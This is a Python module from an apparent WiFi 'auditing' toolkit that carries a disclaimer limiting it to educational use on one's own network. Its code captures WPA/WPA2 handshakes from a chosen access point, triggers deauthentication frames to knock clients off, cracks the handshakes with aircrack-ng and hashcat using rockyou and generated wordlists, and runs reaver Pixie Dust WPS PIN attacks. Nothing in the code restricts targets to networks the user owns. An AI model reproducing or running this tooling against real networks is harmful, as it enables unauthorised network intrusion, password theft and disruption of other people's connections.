"""
Cyber Command Center - WiFi Auditing Tools
Module for WiFi security auditing - handshake capture and analysis
FOR EDUCATIONAL USE ONLY ON YOUR OWN NETWORK
"""
import subprocess
import platform
import threading
import time
import os
import re
from pathlib import Path
from typing import Optional, List, Dict
from datetime import datetime

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
        Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Deauth,
        EAPOL, sniff, wrpcap, rdpcap, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Base paths
BASE_DIR = Path(__file__).resolve().parent.parent
CAPTURES_DIR = BASE_DIR / "captures"
HANDSHAKES_DIR = CAPTURES_DIR / "handshakes"
WORDLISTS_DIR = BASE_DIR / "wordlists"


class HandshakeCapture:
    """
    Capture WPA/WPA2 handshakes for offline cracking
    Requires: Monitor mode capable WiFi adapter
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.is_capturing = False
        self.captured_handshakes = []
        self._capture_thread = None
        
        # Ensure directories exist
        HANDSHAKES_DIR.mkdir(parents=True, exist_ok=True)
        
        if SCAPY_AVAILABLE:
            conf.verb = 0
    
    def check_requirements(self) -> Dict:
        """Check system requirements for handshake capture"""
        reqs = {
            'scapy_available': SCAPY_AVAILABLE,
            'platform': platform.system(),
            'aircrack_available': False,
            'hashcat_available': False,
            'monitor_mode': False,
            'recommendations': []
        }
        
        # Check for aircrack-ng
        try:
            if platform.system().lower() == 'linux':
                subprocess.run(['which', 'aircrack-ng'], 
                             capture_output=True, check=True)
                reqs['aircrack_available'] = True
            else:
                # Check if aircrack is in PATH on Windows
                result = subprocess.run(['where', 'aircrack-ng'], 
                                       capture_output=True)
                reqs['aircrack_available'] = result.returncode == 0
        except (subprocess.CalledProcessError, FileNotFoundError):
            reqs['recommendations'].append(
                "Install aircrack-ng for handshake cracking"
            )
        
        # Check for hashcat
        try:
            subprocess.run(['hashcat', '--version'], 
                         capture_output=True, check=True)
            reqs['hashcat_available'] = True
        except (subprocess.CalledProcessError, FileNotFoundError):
            reqs['recommendations'].append(
                "Install hashcat for GPU-accelerated cracking"
            )
        
        if platform.system().lower() == 'windows':
            reqs['recommendations'].append(
                "For full WiFi auditing, use Kali Linux in WSL2 or VM"
            )
        
        return reqs
    
    def start_capture(self, target_bssid: str, channel: int, 
                     output_file: str = None, timeout: int = 300) -> bool:
        """
        Start capturing handshake for a specific network
        
        Args:
            target_bssid: Target AP's BSSID (MAC)
            channel: WiFi channel
            output_file: Output file path (optional)
            timeout: Capture timeout in seconds
        """
        if not SCAPY_AVAILABLE:
            raise Exception("Scapy not available")
        
        if self.is_capturing:
            return False
        
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = HANDSHAKES_DIR / f"handshake_{target_bssid.replace(':', '')}_{timestamp}.pcap"
        
        self.is_capturing = True
        self.current_capture = {
            'target_bssid': target_bssid,
            'channel': channel,
            'output_file': str(output_file),
            'start_time': datetime.now(),
            'packets': [],
            'eapol_count': 0,
            'handshake_complete': False
        }
        
        def packet_handler(packet):
            """Process captured packets looking for EAPOL"""
            if not self.is_capturing:
                return
            
            try:
                # Check if it's from our target
                if packet.haslayer(Dot11):
                    # Get addresses
                    addr1 = packet.addr1
                    addr2 = packet.addr2
                    addr3 = packet.addr3 if hasattr(packet, 'addr3') else None
                    
                    target = target_bssid.lower()
                    
                    # Check if packet is related to our target
                    is_target = (
                        (addr1 and addr1.lower() == target) or
                        (addr2 and addr2.lower() == target) or
                        (addr3 and addr3.lower() == target)
                    )
                    
                    if not is_target:
                        return
                    
                    # Check for EAPOL (WPA handshake)
                    if packet.haslayer(EAPOL):
                        self.current_capture['packets'].append(packet)
                        self.current_capture['eapol_count'] += 1
                        print(f"[+] EAPOL packet captured! Total: {self.current_capture['eapol_count']}")
                        
                        # A complete 4-way handshake has 4 EAPOL packets
                        # But we only need the first 2 or 3 for cracking
                        if self.current_capture['eapol_count'] >= 4:
                            self.current_capture['handshake_complete'] = True
                            print("[+] Complete handshake captured!")
                            
            except Exception as e:
                pass
        
        def capture_thread():
            try:
                # Capture packets
                sniff(
                    iface=self.interface,
                    prn=packet_handler,
                    timeout=timeout,
                    store=False,
                    stop_filter=lambda x: not self.is_capturing or 
                                          self.current_capture.get('handshake_complete', False)
                )
            except Exception as e:
                print(f"Capture error: {e}")
            finally:
                self._save_capture()
        
        self._capture_thread = threading.Thread(target=capture_thread)
        self._capture_thread.daemon = True
        self._capture_thread.start()
        
        return True
    
    def stop_capture(self) -> Dict:
        """Stop current capture and save results"""
        self.is_capturing = False
        
        if self._capture_thread:
            self._capture_thread.join(timeout=5)
        
        return self._save_capture()
    
    def _save_capture(self) -> Dict:
        """Save captured packets to file"""
        if not self.current_capture:
            return {}
        
        result = {
            'target_bssid': self.current_capture.get('target_bssid'),
            'eapol_count': self.current_capture.get('eapol_count', 0),
            'handshake_complete': self.current_capture.get('handshake_complete', False),
            'output_file': self.current_capture.get('output_file'),
            'packets_captured': len(self.current_capture.get('packets', []))
        }
        
        if self.current_capture.get('packets'):
            try:
                wrpcap(
                    self.current_capture['output_file'],
                    self.current_capture['packets']
                )
                result['saved'] = True
            except Exception as e:
                result['saved'] = False
                result['error'] = str(e)
        
        return result
    
    def send_deauth_for_handshake(self, target_bssid: str, 
                                   client_mac: str = "ff:ff:ff:ff:ff:ff",
                                   count: int = 5) -> bool:
        """
        Send deauth packets to force client reconnection (to capture handshake)
        """
        if not SCAPY_AVAILABLE:
            return False
        
        try:
            from core.deauth import WiFiDeauth
            deauth = WiFiDeauth(self.interface)
            
            # Send deauth packets
            deauth.deauth(client_mac, target_bssid, count=count)
            return True
            
        except Exception as e:
            print(f"Deauth error: {e}")
            return False


class PasswordCracker:
    """
    Crack captured WPA/WPA2 handshakes using wordlists or hashcat
    """
    
    def __init__(self):
        self.is_cracking = False
        self.current_job = None
        
        # Ensure wordlist directory exists
        WORDLISTS_DIR.mkdir(parents=True, exist_ok=True)
    
    def get_wordlists(self) -> List[Dict]:
        """Get available wordlists"""
        wordlists = []
        
        for file in WORDLISTS_DIR.glob("*.txt"):
            try:
                size = file.stat().st_size
                # Count lines (approximate for large files)
                if size < 10_000_000:  # < 10MB
                    with open(file, 'r', errors='ignore') as f:
                        lines = sum(1 for _ in f)
                else:
                    lines = size // 10  # Rough estimate
                
                wordlists.append({
                    'name': file.name,
                    'path': str(file),
                    'size': size,
                    'words': lines
                })
            except Exception:
                pass
        
        return wordlists
    
    def download_wordlist(self, name: str = 'rockyou') -> bool:
        """Download common wordlists"""
        wordlists = {
            'rockyou': 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt',
            'common': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt'
        }
        
        if name not in wordlists:
            return False
        
        try:
            import urllib.request
            output_path = WORDLISTS_DIR / f"{name}.txt"
            
            print(f"Downloading {name} wordlist...")
            urllib.request.urlretrieve(wordlists[name], output_path)
            print(f"Downloaded to {output_path}")
            return True
            
        except Exception as e:
            print(f"Download error: {e}")
            return False
    
    def crack_with_aircrack(self, capture_file: str, wordlist: str,
                           bssid: str = None) -> Dict:
        """
        Crack handshake using aircrack-ng
        
        Args:
            capture_file: Path to .cap/.pcap file with handshake
            wordlist: Path to wordlist file
            bssid: Target BSSID (optional, auto-detect if not provided)
        """
        result = {
            'method': 'aircrack-ng',
            'status': 'running',
            'capture_file': capture_file,
            'wordlist': wordlist,
            'cracked': False,
            'password': None
        }
        
        try:
            cmd = ['aircrack-ng', '-w', wordlist]
            
            if bssid:
                cmd.extend(['-b', bssid])
            
            cmd.append(capture_file)
            
            # Run aircrack-ng
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600  # 1 hour timeout
            )
            
            output = process.stdout + process.stderr
            
            # Check for success
            if 'KEY FOUND' in output:
                # Extract password
                match = re.search(r'KEY FOUND! \[ (.+?) \]', output)
                if match:
                    result['cracked'] = True
                    result['password'] = match.group(1)
                    result['status'] = 'success'
            else:
                result['status'] = 'not_found'
                
        except subprocess.TimeoutExpired:
            result['status'] = 'timeout'
        except FileNotFoundError:
            result['status'] = 'error'
            result['error'] = 'aircrack-ng not found. Install it first.'
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def crack_with_hashcat(self, capture_file: str, wordlist: str,
                          hash_mode: int = 22000) -> Dict:
        """
        Crack handshake using hashcat (GPU accelerated)
        
        Note: Requires converting capture to hashcat format first
        """
        result = {
            'method': 'hashcat',
            'status': 'running',
            'capture_file': capture_file,
            'wordlist': wordlist,
            'cracked': False,
            'password': None
        }
        
        try:
            # Convert capture to hashcat format (requires hcxpcapngtool)
            hash_file = capture_file.replace('.pcap', '.hc22000').replace('.cap', '.hc22000')
            
            convert_cmd = ['hcxpcapngtool', '-o', hash_file, capture_file]
            subprocess.run(convert_cmd, capture_output=True)
            
            if not os.path.exists(hash_file):
                result['status'] = 'error'
                result['error'] = 'Could not convert capture file'
                return result
            
            # Run hashcat
            cmd = [
                'hashcat',
                '-m', str(hash_mode),
                '-a', '0',  # Wordlist attack
                hash_file,
                wordlist,
                '--quiet'
            ]
            
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=7200  # 2 hour timeout
            )
            
            # Check results
            show_cmd = ['hashcat', '-m', str(hash_mode), hash_file, '--show']
            show_result = subprocess.run(show_cmd, capture_output=True, text=True)
            
            if show_result.stdout.strip():
                # Format: hash:password
                parts = show_result.stdout.strip().split(':')
                if len(parts) >= 2:
                    result['cracked'] = True
                    result['password'] = parts[-1]
                    result['status'] = 'success'
            else:
                result['status'] = 'not_found'
                
        except subprocess.TimeoutExpired:
            result['status'] = 'timeout'
        except FileNotFoundError as e:
            result['status'] = 'error'
            result['error'] = f'Tool not found: {e}'
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def generate_custom_wordlist(self, base_words: List[str], 
                                 output_file: str = None) -> str:
        """
        Generate a custom wordlist based on base words
        Adds common variations (numbers, special chars, leetspeak)
        """
        if not output_file:
            output_file = WORDLISTS_DIR / "custom_wordlist.txt"
        
        variations = set()
        
        for word in base_words:
            # Original
            variations.add(word)
            variations.add(word.lower())
            variations.add(word.upper())
            variations.add(word.capitalize())
            
            # With numbers
            for i in range(100):
                variations.add(f"{word}{i}")
                variations.add(f"{word}{i:02d}")
            
            for year in range(1990, 2030):
                variations.add(f"{word}{year}")
            
            # With special chars
            for char in ['!', '@', '#', '$', '*', '.', '_']:
                variations.add(f"{word}{char}")
                variations.add(f"{char}{word}")
                variations.add(f"{word}{char}123")
            
            # Leetspeak
            leetspeak = word.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
            variations.add(leetspeak)
        
        # Write to file
        with open(output_file, 'w') as f:
            for var in sorted(variations):
                f.write(var + '\n')
        
        return str(output_file)


class WPSAttack:
    """
    WPS PIN attack (Reaver/Bully)
    Many routers are vulnerable to WPS attacks
    """
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.is_attacking = False
    
    def check_wps_enabled(self, bssid: str) -> bool:
        """Check if WPS is enabled on target network"""
        try:
            # Use wash to check for WPS
            cmd = ['wash', '-i', self.interface, '-C']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            return bssid.upper() in result.stdout.upper()
            
        except Exception:
            return False
    
    def start_attack(self, bssid: str, channel: int) -> Dict:
        """
        Start WPS PIN attack using reaver
        """
        result = {
            'method': 'reaver',
            'status': 'running',
            'bssid': bssid,
            'cracked': False,
            'pin': None,
            'password': None
        }
        
        try:
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', bssid,
                '-c', str(channel),
                '-vv',  # Verbose
                '-K', '1'  # Pixie dust attack
            ]
            
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=3600
            )
            
            output = process.stdout + process.stderr
            
            # Check for success
            if 'WPS PIN' in output:
                pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", output)
                if pin_match:
                    result['pin'] = pin_match.group(1)
            
            if 'WPA PSK' in output:
                psk_match = re.search(r"WPA PSK:\s*'(.+?)'", output)
                if psk_match:
                    result['password'] = psk_match.group(1)
                    result['cracked'] = True
                    result['status'] = 'success'
            else:
                result['status'] = 'not_found'
                
        except subprocess.TimeoutExpired:
            result['status'] = 'timeout'
        except FileNotFoundError:
            result['status'] = 'error'
            result['error'] = 'reaver not found. Install: sudo apt install reaver'
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result


if __name__ == "__main__":
    print("WiFi Audit module loaded")
    print(f"Captures directory: {CAPTURES_DIR}")
    print(f"Wordlists directory: {WORDLISTS_DIR}")
    
    # Check requirements
    capture = HandshakeCapture()
    reqs = capture.check_requirements()
    print("\nRequirements check:")
    for key, value in reqs.items():
        print(f"  {key}: {value}")
